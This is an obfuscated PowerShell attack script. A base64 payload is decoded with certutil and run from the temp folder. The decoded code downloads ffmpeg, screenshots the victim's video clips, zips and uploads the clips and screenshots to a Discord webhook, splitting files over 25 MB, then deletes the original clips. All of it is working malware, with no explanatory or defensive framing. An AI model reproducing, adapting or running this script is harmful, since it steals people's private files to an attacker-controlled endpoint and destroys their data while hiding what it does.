$webhook = "DiscordWebhook"
$timePosition = "00:00:02"
$TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo JHNjcmlwdCA9IEAnDQogICAkcGxheWVyID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0ICdXTVBsYXllci5PQ1gnDQogICAkcGxheWVyLlVSTCA9ICJodHRwczovL2F1ZGlvLmp1a2Vob3N0LmNvLnVrL1JPUVFhc3pmSklITnlhb3NzT0VPWVcyOXk0VXNBUEFEIg0KICAgJHBsYXllci5TZXR0aW5ncy5Wb2x1bWUgPSA1MCAgIyBTZXQgdGhlIHZvbHVtZSB0byA1MCUNCiAgICRwbGF5ZXINCidADQokcnVuc3BhY2UgPSBbUnVuc3BhY2VGYWN0b3J5XTo6Q3JlYXRlUnVuc3BhY2UoKQ0KJHJ1bnNwYWNlLkFwYXJ0bWVudFN0YXRlID0gIk1UQSINCiRiZ1Bvd2VyU2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpDQokYmdQb3dlclNoZWxsLlJ1bnNwYWNlID0gJHJ1bnNwYWNlDQokcnVuc3BhY2UuT3BlbigpDQokcGxheWVyID0gQCgkYmdQb3dlclNoZWxsLkFkZFNjcmlwdCgkc2NyaXB0KS5JbnZva2UoKSlbMF0NCnRyeQ0KeyAgIA0KICAgIHdoaWxlKCR0cnVlKQ0KICAgIHsNCiAgICAgICAgU3RhcnQtU2xlZXAgLW0gNTAwDQogICAgICAgIGlmKCRwbGF5ZXIucGxheVN0YXRlIC1lcSAxKSB7IGJyZWFrIH0NCiAgICB9DQp9DQpmaW5hbGx5DQp7DQogICAgJHBsYXllci5jb250cm9scy5zdG9wKCkNCiAgICAkYmdQb3dlclNoZWxsLkRpc3Bvc2UoKQ0KfQ0KJGZvbGRlclBhdGggPSAiJGVudjpVU0VSUFJPRklMRVxWaWRlb3NcVUNsaXBzIg0KZnVuY3Rpb24gRmluZC1FeGVjdXRhYmxlKCRleGVjdXRhYmxlTmFtZSkgew0KICAgICRwYXRoID0gR2V0LUNoaWxkSXRlbSAtUGF0aCBDOlwgLVJlY3Vyc2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCANCiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWVxICRleGVjdXRhYmxlTmFtZSB9IHwgDQogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxDQoNCiAgICBpZiAoJHBhdGgpIHsNCiAgICAgICAgcmV0dXJuICRwYXRoLkZ1bGxOYW1lDQogICAgfQ0KICAgIHJldHVybiAkbnVsbA0KfQ0KZnVuY3Rpb24gQ2hlY2stRkZtcGVnSW5zdGFsbGVkIHsNCiAgICB0cnkgew0KICAgICAgICAmICRmZm1wZWdQYXRoIC12ZXJzaW9uDQogICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgfQ0KfQ0KZnVuY3Rpb24gTWFpbiB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRzZWFyY2hGb2xkZXJQYXRoID0gIiRlbnY6VVNFUlBST0ZJTEVcVmlkZW9zXFVDbGlwcyIsDQogICAgICAgIFtzdHJpbmddJG91dHB1dEZvbGRlciA9ICIkZW52OlVTRVJQUk9GSUxFXFZpZGVvc1xVQ2xpcHNcU2NyZWVuc2hvdHMiLA0KICAgICAgICBbc3RyaW5nXSR0aW1lUG9zaXRpb24NCiAgICApDQoNCiAgICAjIENoZWNrIGlmICR0aW1lUG9zaXRpb24gaXMgc2V0LCBpZiBub3QgdXNlICIwMDowMDowMiINCiAgICBpZiAoW3N0cmluZ106OklzTnVsbE9yRW1wdHkoJHRpbWVQb3NpdGlvbikpIHsNCiAgICAgICAgJHRpbWVQb3NpdGlvbiA9ICIwMDowMDowMiINCiAgICB9DQoNCiAgICAkZmZtcGVnRm9sZGVyID0gIiRzZWFyY2hGb2xkZXJQYXRoXERPLU5PVC1ERUxFVEUtTUUiDQogICAgJGZsYWdGaWxlUGF0aCA9ICIkZmZtcGVnRm9sZGVyXGZmbXBlZ19pbnN0YWxsZWQuZmxhZyINCg0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJGZsYWdGaWxlUGF0aCkpIHsNCiAgICAgICAgSW5zdGFsbC1GRm1wZWcgJGZmbXBlZ0ZvbGRlcg0KICAgICAgICBOZXctSXRlbSAtUGF0aCAkZmxhZ0ZpbGVQYXRoIC1JdGVtVHlwZSBGaWxlIC1Gb3JjZQ0KICAgIH0NCg0KICAgIHJldHVybiAkc2VhcmNoRm9sZGVyUGF0aCwgJG91dHB1dEZvbGRlciwgJHRpbWVQb3NpdGlvbg0KfQ0KZnVuY3Rpb24gSW5zdGFsbC1GRm1wZWcgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kaW5zdGFsbERpcg0KICAgICkNCiAgICAkZG93bmxvYWRVcmwgPSAiaHR0cHM6Ly9naXRodWIuY29tL0J0Yk4vRkZtcGVnLUJ1aWxkcy9yZWxlYXNlcy9kb3dubG9hZC9sYXRlc3QvZmZtcGVnLW1hc3Rlci1sYXRlc3Qtd2luNjQtZ3BsLXNoYXJlZC56aXAiDQogICAgJGZmbXBlZ1ppcCA9ICIkaW5zdGFsbERpclxmZm1wZWcuemlwIg0KDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkaW5zdGFsbERpcikpIHsNCiAgICAgICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkaW5zdGFsbERpcg0KICAgIH0NCg0KICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJGRvd25sb2FkVXJsIC1PdXRGaWxlICRmZm1wZWdaaXANCiAgICBFeHBhbmQtQXJjaGl2ZSAtUGF0aCAkZmZtcGVnWmlwIC1EZXN0aW5hdGlvblBhdGggJGluc3RhbGxEaXINCn0NCiRzZWFyY2hGb2xkZXJQYXRoLCAkb3V0cHV0Rm9sZGVyLCAkdGltZVBvc2l0aW9uID0gTWFpbg0KJGZmbXBlZ1BhdGggPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRzZWFyY2hGb2xkZXJQYXRoIC1SZWN1cnNlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtZXEgImZmbXBlZy5leGUiIH0gfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxDQppZiAoJGZmbXBlZ1BhdGgpIHsNCiAgICAkZmZtcGVnUGF0aCA9ICRmZm1wZWdQYXRoLkZ1bGxOYW1lDQp9IGVsc2Ugew0KICAgIHRocm93ICJGRm1wZWcgZXhlY3V0YWJsZSBub3QgZm91bmQuIg0KfQ0KaWYgKC1ub3QgKFRlc3QtUGF0aCAkc2VhcmNoRm9sZGVyUGF0aCkpIHsNCiAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRzZWFyY2hGb2xkZXJQYXRoDQp9DQppZiAoLW5vdCAoVGVzdC1QYXRoICRvdXRwdXRGb2xkZXIpKSB7DQogICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkb3V0cHV0Rm9sZGVyDQp9DQokdmlkZW9FeHRlbnNpb25zID0gQCgnKi5tcDQnLCAnKi5hdmknLCAnKi5ta3YnLCAnKi5tb3YnLCAnKi5mbHYnLCAnKi53bXYnLCAnKi5tcGVnJykNCiRhbGxWaWRlb0ZpbGVzID0gQCgpDQpmb3JlYWNoICgkZXh0IGluICR2aWRlb0V4dGVuc2lvbnMpIHsNCiAgICB0cnkgew0KICAgICAgICAkYWxsVmlkZW9GaWxlcyArPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRzZWFyY2hGb2xkZXJQYXRoIC1SZWN1cnNlIC1JbmNsdWRlICRleHQgLUZpbGUgLUVycm9yQWN0aW9uIFN0b3ANCiAgICB9IGNhdGNoIHsNCiAgICAgICAgV3JpdGUtV2FybmluZyAiU2tpcHBlZCBhIGZpbGUgb3IgZGlyZWN0b3J5IGR1ZSB0byBhbiBlcnJvcjogJF8iDQogICAgfQ0KfQ0KJGFsbFZpZGVvRmlsZXMgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgJHZpZGVvUGF0aCA9ICRfLkZ1bGxOYW1lDQogICAgJHNjcmVlbnNob3ROYW1lID0gIiQoJF8uQmFzZU5hbWUpX3NjcmVlbnNob3QuanBnIg0KICAgICRvdXRwdXRGaWxlUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkb3V0cHV0Rm9sZGVyIC1DaGlsZFBhdGggJHNjcmVlbnNob3ROYW1lDQogICAgaWYgKFRlc3QtUGF0aCAkb3V0cHV0RmlsZVBhdGgpIHsNCiAgICAgICAgUmVtb3ZlLUl0ZW0gLVBhdGggJG91dHB1dEZpbGVQYXRoIC1Gb3JjZQ0KICAgIH0NCiAgICAmICRmZm1wZWdQYXRoIC1zcyAkdGltZVBvc2l0aW9uIC1pICR2aWRlb1BhdGggLXZmcmFtZXMgMSAkb3V0cHV0RmlsZVBhdGgNCiAgICBXcml0ZS1PdXRwdXQgIlNjcmVlbnNob3QgZnJvbSAkdmlkZW9QYXRoIHNhdmVkIHRvICRvdXRwdXRGaWxlUGF0aCINCn0NCiRsb2cgPSAkb3V0cHV0RmlsZVBhdGgNCiRmaWxlbmFtZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldEZpbGVOYW1lKCRsb2cpDQokc2NyZWVuc2hvdEZpbGVzID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkb3V0cHV0Rm9sZGVyIC1JbmNsdWRlICIqLmpwZyIgLUZpbGUgLVJlY3Vyc2UNCmZvcmVhY2ggKCRzY3JlZW5zaG90RmlsZSBpbiAkc2NyZWVuc2hvdEZpbGVzKSB7DQogICAgJGxvZyA9ICRzY3JlZW5zaG90RmlsZS5GdWxsTmFtZQ0KICAgICRmaWxlbmFtZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldEZpbGVOYW1lKCRsb2cpDQogICAgJGhleENvbG9yID0gIjU1MjU4MyINCiAgICAkY29sb3JJbnQgPSBbY29udmVydF06OlRvSW50MzIoJGhleENvbG9yLCAxNikNCiAgICAkY3VycmVudFRpbWUgPSAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCJ5eXl5LU1NLWRkVEhIOm1tOnNzWiIpDQogICAgJHBheWxvYWRPYmplY3QgPSBAew0KICAgICAgICBlbWJlZHMgPSBAKA0KICAgICAgICAgICAgQHsNCiAgICAgICAgICAgICAgICB0aXRsZSA9ICRmaWxlbmFtZQ0KICAgICAgICAgICAgICAgIGNvbG9yID0gJGNvbG9ySW50DQogICAgICAgICAgICAgICAgaW1hZ2UgPSBAew0KICAgICAgICAgICAgICAgICAgICB1cmwgPSAiYXR0YWNobWVudDovLyRmaWxlbmFtZSINCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICkNCiAgICB9DQogICAgJHBheWxvYWRKc29uID0gJHBheWxvYWRPYmplY3QgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggNA0KICAgICR0ZW1wRmlsZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBGaWxlTmFtZSgpDQogICAgU2V0LUNvbnRlbnQgLVBhdGggJHRlbXBGaWxlIC1WYWx1ZSAkcGF5bG9hZEpzb24NCiAgICAkY3VybENvbW1hbmQgPSBAKA0KICAgICAgICAnY3VybC5leGUnLA0KICAgICAgICAnLUYnLCAoInBheWxvYWRfanNvbj08JHRlbXBGaWxlIiksDQogICAgICAgICctRicsICgiZmlsZT1AJGxvZztmaWxlbmFtZT0kZmlsZW5hbWUiKSwNCiAgICAgICAgJHdlYmhvb2sNCiAgICApDQogICAgJiAkY3VybENvbW1hbmRbMF0gJGN1cmxDb21tYW5kWzEuLigkY3VybENvbW1hbmQuTGVuZ3RoIC0gMSldDQogICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDApIHsNCiAgICAgICAgV3JpdGUtSG9zdCAiQ3VybCBleGl0ZWQgd2l0aCBjb2RlICRMQVNURVhJVENPREUiDQogICAgfQ0KICAgIFJlbW92ZS1JdGVtIC1QYXRoICR0ZW1wRmlsZSAtRm9yY2UNCn0NCiRSQU4gPSAtam9pbiAoKDY1Li45MCkgKyAoOTcuLjEyMikgfCBHZXQtUmFuZG9tIC1Db3VudCA4IHwgJSB7W2NoYXJdJF99KQ0KJGRpcl9uYW1lID0gIiRSQU4iDQokcGF0aCA9ICIkZW52OnRlbXBcJGRpcl9uYW1lIg0KaWYgKCEoVGVzdC1QYXRoICIkcGF0aCIpKSANCnsNCiAgTmV3LUl0ZW0gIiRwYXRoIiAtSXRlbVR5cGUgRGlyZWN0b3J5ID4kbnVsbCAyPiYxDQp9DQokY2xpcHMgPSAiJGVudjp1c2VycHJvZmlsZVxWaWRlb3NcVUNsaXBzIg0KaWYgKCEoVGVzdC1QYXRoIC1QYXRoICIkY2xpcHMiKSkgew0KTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAiJGNsaXBzIg0KfQ0KU2V0LUxvY2F0aW9uICIkcGF0aCINCiRmaWxlbGlzdCA9ICJsaXN0X29mX2FsbF9maWxlX2xvY2F0aW9ucy50eHQiDQokZm9sZGVycyA9IEAoIiRlbnY6dXNlcnByb2ZpbGVcVmlkZW9zXFVDbGlwcyIpDQokZXh0cyA9IEAoIm1wNCIsImZsdiIsIm1rdiIsIm1vdiIsInRzIikNCiR6aXBmaWxlID0gIi56aXAiDQppZiAoVGVzdC1QYXRoICIkcGF0aFwkZmlsZWxpc3QiKQ0Kew0KICBSZW1vdmUtSXRlbSAiJHBhdGhcJGZpbGVsaXN0IiAtRm9yY2UgPiRudWxsIDI+JjENCn0NCk5ldy1JdGVtIC1QYXRoICIkcGF0aCIgLU5hbWUgIiRmaWxlbGlzdCIgLUl0ZW1UeXBlIEZpbGUgPiRudWxsIDI+JjENCiRzaG93Zm9sZGVycyA9ICIkZm9sZGVycyINCiRsaXN0Zm9sZGVycyA9ICRzaG93Zm9sZGVycy5yZXBsYWNlKCdcJywnXFwnKQ0KJGZvcm1hdGZvbGRlcnMgPSAkbGlzdGZvbGRlcnMucmVwbGFjZSgnICcsJ1xuJykNCiRpID0gJ1tEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KGludCBoYW5kbGUsIGludCBzdGF0ZSk7JzsNCmFkZC10eXBlIC1uYW1lIHdpbiAtbWVtYmVyICRpIC1uYW1lc3BhY2UgbmF0aXZlOw0KW25hdGl2ZS53aW5dOjpTaG93V2luZG93KChbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpHZXRDdXJyZW50UHJvY2VzcygpIHwgR2V0LVByb2Nlc3MpLk1haW5XaW5kb3dIYW5kbGUsIDEpOw0KJHBheWxvYWRPYmplY3QgPSBAew0KICAgIGVtYmVkcyA9IEAoDQogICAgICAgIEB7DQogICAgICAgICAgICB0aXRsZSA9ICJNZWRpYSBVcGxvYWQgU3RhcnQuLi4iDQogICAgICAgICAgICBkZXNjcmlwdGlvbiA9ICJ7YGBgVGFyZ2V0IEZpbGUgRXh0ZW5zaW9uczogJGV4dHMgVGFyZ2V0IEZvbGRlcjogJGZvcm1hdGZvbGRlcnNgYGB9Ig0KICAgICAgICAgICAgY29sb3IgPSAkY29sb3JJbnQNCiAgICAgICAgICAgIHRpbWVzdGFtcCA9ICRjdXJyZW50VGltZQ0KICAgICAgICB9DQogICAgKQ0KfQ0KJHBheWxvYWRKc29uID0gJHBheWxvYWRPYmplY3QgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggNA0KJHRlbXBGaWxlID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcEZpbGVOYW1lKCkNClNldC1Db250ZW50IC1QYXRoICR0ZW1wRmlsZSAtVmFsdWUgJHBheWxvYWRKc29uDQokY3VybENvbW1hbmQgPSBAKA0KICAgICdjdXJsLmV4ZScsDQogICAgJy1GJywgKCJwYXlsb2FkX2pzb249PCR0ZW1wRmlsZSIpLA0KICAgICR3ZWJob29rDQopDQomICRjdXJsQ29tbWFuZFswXSAkY3VybENvbW1hbmRbMS4uKCRjdXJsQ29tbWFuZC5MZW5ndGggLSAxKV0NCmlmICgkTEFTVEVYSVRDT0RFIC1uZSAwKSB7DQogICAgV3JpdGUtSG9zdCAiQ3VybCBleGl0ZWQgd2l0aCBjb2RlICRMQVNURVhJVENPREUiDQp9DQpmb3JlYWNoICgkZCBpbiAkZm9sZGVycykNCnsNCiAgZm9yZWFjaCAoJGUgaW4gJGV4dHMpDQogIHsNCiAgICAgR2V0LUNoaWxkSXRlbSAtUGF0aCAkZCAtRmlsdGVyICIqLiRlIiAtUmVjdXJzZSAtRGVwdGggMiB8ICV7JF8uRnVsbE5hbWV9IHwgT3V0LUZpbGUgLUZpbGVQYXRoICIkcGF0aFwkZmlsZWxpc3QiIC1BcHBlbmQgPiRudWxsIDI+JjENCiAgfQ0KICAkdmVyaWZ5bm9maWxlcyA9IChHZXQtQ29udGVudCAiJHBhdGhcJGZpbGVsaXN0IikuTGVuZ3RoDQogIGlmICggMCAtbmUgJHZlcmlmeW5vZmlsZXMgKQ0KICB7DQogICAgJGRpciA9IFNwbGl0LVBhdGggJGQgLUxlYWYNCiAgICBmb3JlYWNoICgkZmlsZW5hbWUgaW4gR2V0LUNvbnRlbnQgIiRwYXRoXCRmaWxlbGlzdCIpDQogICAgew0KICAgICAgQ29tcHJlc3MtQXJjaGl2ZSAtVXBkYXRlICIkZmlsZW5hbWUiICIkcGF0aFwkZW52OmNvbXB1dGVybmFtZS0kZGlyLUZvbGRlciR6aXBmaWxlIiA+JG51bGwgMj4mMQ0KICAgIH0NCiAgICBDb21wcmVzcy1BcmNoaXZlIC1VcGRhdGUgIiRwYXRoXCRmaWxlbGlzdCIgIiRwYXRoXCRlbnY6Y29tcHV0ZXJuYW1lLSRkaXItRm9sZGVyJHppcGZpbGUiID4kbnVsbCAyPiYxDQogICAgJGNvbnRlbnRfc2l6ZSA9IChHZXQtSXRlbSAtUGF0aCAiJHBhdGhcJGVudjpjb21wdXRlcm5hbWUtJGRpci1Gb2xkZXIkemlwZmlsZSIpIHwgJSB7W21hdGhdOjpjZWlsaW5nKCRfLmxlbmd0aCAvIDFNQil9DQogICAgaWYgKCAkY29udGVudF9zaXplIC1sdCAyNSApDQogICAgew0KICAgICAgICAgICAgDQogICAgY3VybC5leGUgLUYgInBheWxvYWRfanNvbj17XGAiY29udGVudFxgIjogXGAiXGAifSIgLUYgImZpbGU9QFxgIiRwYXRoXCRlbnY6Y29tcHV0ZXJuYW1lLSRkaXItRm9sZGVyJHppcGZpbGVcYCIiICR3ZWJob29rDQogICAgUmVtb3ZlLUl0ZW0gIiRwYXRoXCRlbnY6Y29tcHV0ZXJuYW1lLSRkaXItRm9sZGVyJHppcGZpbGUiID4kbnVsbCAyPiYxDQogICAgfQ0KICAgIGVsc2VpZiAoICRjb250ZW50X3NpemUgLWd0IDI1ICkNCiAgICB7DQokcGF5bG9hZE9iamVjdCA9IEB7DQogICAgZW1iZWRzID0gQCgNCiAgICAgICAgQHsNCiAgICAgICAgICAgIGRlc2NyaXB0aW9uID0gIntgYGBFUlJPUjogRmlsZSBUT08gTEFSR0UhKCRjb250ZW50X3NpemUgTUIpIEF0dGVtcHRpbmcgc3BsaXQgZmlsZSgyNCBNQikgYW5kIHVwbG9hZC4gRmlsZSA6ICRlbnY6Y29tcHV0ZXJuYW1lLSRkaXItRm9sZGVyJHppcGZpbGVgYGB9Ig0KICAgICAgICAgICAgY29sb3IgPSAkY29sb3JJbnQNCiAgICAgICAgfQ0KICAgICkNCn0NCiRwYXlsb2FkSnNvbiA9ICRwYXlsb2FkT2JqZWN0IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDQNCiR0ZW1wRmlsZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBGaWxlTmFtZSgpDQpTZXQtQ29udGVudCAtUGF0aCAkdGVtcEZpbGUgLVZhbHVlICRwYXlsb2FkSnNvbg0KJGN1cmxDb21tYW5kID0gQCgNCiAgICAnY3VybC5leGUnLA0KICAgICctRicsICgicGF5bG9hZF9qc29uPTwkdGVtcEZpbGUiKSwNCiAgICAkd2ViaG9vaw0KKQ0KJiAkY3VybENvbW1hbmRbMF0gJGN1cmxDb21tYW5kWzEuLigkY3VybENvbW1hbmQuTGVuZ3RoIC0gMSldDQppZiAoJExBU1RFWElUQ09ERSAtbmUgMCkgew0KICAgIFdyaXRlLUhvc3QgIkN1cmwgZXhpdGVkIHdpdGggY29kZSAkTEFTVEVYSVRDT0RFIg0KfQ0KICAgICAgJG1heEZpbGVTaXplID0gMjRNQg0KICAgICAgJGVuY19wYXRoID0gIiouemlwIg0KICAgICAgJGZpbGVzID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAiJHB3ZFwqLnppcCIgLVJlY3Vyc2UgLUZpbGUgfCBXaGVyZS1PYmplY3QgeyAkXy5MZW5ndGggLWd0ICRtYXhGaWxlU2l6ZSB9DQoNCiAgICAgIGZvcmVhY2ggKCRmaWxlIGluICRmaWxlcykNCiAgICAgIHsNCiAgICAgICAgJG51bVNwbGl0cyA9IFttYXRoXTo6Q2VpbGluZygkZmlsZS5MZW5ndGggLyAkbWF4RmlsZVNpemUpDQogICAgICAgICRvZmZzZXQgPSAwDQogICAgICAgIGZvciAoJGkgPSAxOyAkaSAtbGUgJG51bVNwbGl0czsgJGkrKykgew0KICAgICAgICAgICRqID0gJ3swOmQzfScgLWYgJGkNCiAgICAgICAgICAkc3BsaXRGaWxlUGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkcHdkIC1DaGlsZFBhdGggKCRmaWxlLkJhc2VOYW1lICsgJGZpbGUuRXh0ZW5zaW9uICsgIi4kaiIpDQogICAgICAgICAgJGxlbmd0aCA9IFtNYXRoXTo6TWluKCRtYXhGaWxlU2l6ZSwgJGZpbGUuTGVuZ3RoIC0gJG9mZnNldCkNCiAgICAgICAgICAkYnVmZmVyID0gTmV3LU9iamVjdCBieXRlW10gJGxlbmd0aA0KICAgICAgICAgICRzdHJlYW0gPSBbU3lzdGVtLklPLkZpbGVdOjpPcGVuUmVhZCgkZmlsZS5GdWxsTmFtZSkNCiAgICAgICAgICAkc3RyZWFtLlNlZWsoJG9mZnNldCwgW1N5c3RlbS5JTy5TZWVrT3JpZ2luXTo6QmVnaW4pDQogICAgICAgICAgJHN0cmVhbS5SZWFkKCRidWZmZXIsIDAsICRsZW5ndGgpDQogICAgICAgICAgJHN0cmVhbS5DbG9zZSgpDQogICAgICAgICAgJG91dHB1dFN0cmVhbSA9IFtTeXN0ZW0uSU8uRmlsZV06Ok9wZW5Xcml0ZSgkc3BsaXRGaWxlUGF0aCkNCiAgICAgICAgICAkb3V0cHV0U3RyZWFtLldyaXRlKCRidWZmZXIsIDAsICRsZW5ndGgpDQogICAgICAgICAgJG91dHB1dFN0cmVhbS5DbG9zZSgpDQogICAgICAgICAgJG9mZnNldCArPSAkbGVuZ3RoDQogICAgICAgIH0NCiAgICAgIH0NCiAgICAgIFJlbW92ZS1JdGVtICIkcGF0aFwkZW52OmNvbXB1dGVybmFtZS0kZGlyLUZvbGRlciR6aXBmaWxlIiA+JG51bGwgMj4mMQ0KICAgICAgJHBhcnRmaWxlcyA9IEdldC1DaGlsZEl0ZW0gLUZpbHRlciAiKi56aXAuKiIgLVJlY3Vyc2UNCiAgICAgIGZvcmVhY2ggKCRwIGluICRwYXJ0ZmlsZXMpDQogICAgICB7DQogICAgICAgIGN1cmwuZXhlIC1GICJwYXlsb2FkX2pzb249e1xgImNvbnRlbnRcYCI6IFxgIlxgIn0iIC1GICJmaWxlPUBcYCIkcFxgIiIgJHdlYmhvb2sNCiAgICAgICAgUmVtb3ZlLUl0ZW0gIiRwIiAtRm9yY2UgPiRudWxsIDI+JjENCiAgICAgIH0NCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgIFdyaXRlLUhvc3QgIlNvbWV0aGluZyB3ZW50IHdyb25nLiINCiAgICB9DQogIH0NCiAgUmVtb3ZlLUl0ZW0gIiRwYXRoXCRmaWxlbGlzdCIgLUZvcmNlID4kbnVsbCAyPiYxDQp9DQokcGF5bG9hZE9iamVjdCA9IEB7DQogICAgZW1iZWRzID0gQCgNCiAgICAgICAgQHsNCiAgICAgICAgICAgIHRpdGxlID0gIk1lZGlhIFVwbG9hZCBDb21wbGV0ZSEiDQogICAgICAgICAgICBjb2xvciA9ICRjb2xvckludA0KICAgICAgICAgICAgdGltZXN0YW1wID0gJGN1cnJlbnRUaW1lDQogICAgICAgIH0NCiAgICApDQp9DQokcGF5bG9hZEpzb24gPSAkcGF5bG9hZE9iamVjdCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCA0DQokdGVtcEZpbGUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQ0KU2V0LUNvbnRlbnQgLVBhdGggJHRlbXBGaWxlIC1WYWx1ZSAkcGF5bG9hZEpzb24NCiRjdXJsQ29tbWFuZCA9IEAoDQogICAgJ2N1cmwuZXhlJywNCiAgICAnLUYnLCAoInBheWxvYWRfanNvbj08JHRlbXBGaWxlIiksDQogICAgJHdlYmhvb2sNCikNCiYgJGN1cmxDb21tYW5kWzBdICRjdXJsQ29tbWFuZFsxLi4oJGN1cmxDb21tYW5kLkxlbmd0aCAtIDEpXQ0KaWYgKCRMQVNURVhJVENPREUgLW5lIDApIHsNCiAgICBXcml0ZS1Ib3N0ICJDdXJsIGV4aXRlZCB3aXRoIGNvZGUgJExBU1RFWElUQ09ERSINCn0NClJlbW92ZS1JdGVtIC1QYXRoICR0ZW1wRmlsZQ0KUmVtb3ZlLUl0ZW0gIiRwYXRoIiAtRm9yY2UgPiRudWxsIDI+JjENCiRmaWxlcyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJGZvbGRlclBhdGggLUZpbGUNCmZvcmVhY2ggKCRmaWxlIGluICRmaWxlcykgew0KICAgIFJlbW92ZS1JdGVtIC1QYXRoICRmaWxlLkZ1bGxOYW1lIC1Gb3JjZQ0KfQ0KUmVtb3ZlLUl0ZW0gIiRvdXRwdXRGb2xkZXIiIC1SZWN1cnNlIC1Gb3JjZQ0KQ2xlYXItSG9zdA0KV3JpdGUtSG9zdCAiRVhQT1JUIENPTVBMRVRFISI= > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
